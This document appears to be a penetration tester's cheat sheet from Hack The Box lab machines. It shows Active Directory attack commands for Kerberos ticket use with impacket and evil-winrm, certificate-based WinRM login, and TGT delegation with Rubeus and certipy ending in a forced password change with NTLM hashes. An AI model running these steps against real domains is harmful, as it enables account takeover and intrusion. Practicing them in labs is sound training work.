## KRB5.conf
```powershell
// Get TGT
impacket-getTGT voleur.htb/svc_winrm -dc-ip 10.129.232.130

// Export TGT Files
export KRB5CCNAME=svc_winrm.ccache

// Modify Realm
sudo tee /etc/krb5.conf > /dev/null <<EOF
[libdefaults]
    default_realm = VOLEUR.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false

[realms]
    VOLEUR.HTB = {
        kdc = dc.voleur.htb
        admin_server = dc.voleur.htb
    }

[domain_realm]
    .voleur.htb = VOLEUR.HTB
    voleur.htb = VOLEUR.HTB
EOF

// Connect with TGT
evil-winrm -i dc.voleur.htb -r VOLEUR.HTB                                                                                                               
```

## PFX Authentication
```
openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem

evil-winrm -i 10.10.11.152 -c cert.pem -k key.pem -S
```

## TGT Delegation
```
.\Rubeus.exe tgtdeleg /nowrap

nano svc_sql.kirbi.b64
cat svc_sql.kirbi.b64 | base64 -d > svc_sql.kirbi

impacket-ticketConverter svc_sql.kirbi svc_sql.ccache
export KRB5CCNAME=svc_sql.ccache

certipy-ad req -u svc_sql -k -no-pass -target DC02.darkzero.ext -ca 'darkzero-ext-DC02-CA' -template 'user'

certipy-ad auth -pfx svc_sql.pfx -domain darkzero.ext -dc-ip 172.16.20.2

python3 -c 'import hashlib,binascii; print(binascii.hexlify(hashlib.new("md4","Password1!".encode("utf-16le")).digest()).decode())'
7facdc498ed1680c4fd1448319a8c04f

impacket-changepasswd -hashes :816ccb849956b531db139346751db65f -newhash :7facdc498ed1680c4fd1448319a8c04f 'darkzero.ext/svc_sql'@dc02.darkzero.ext
```
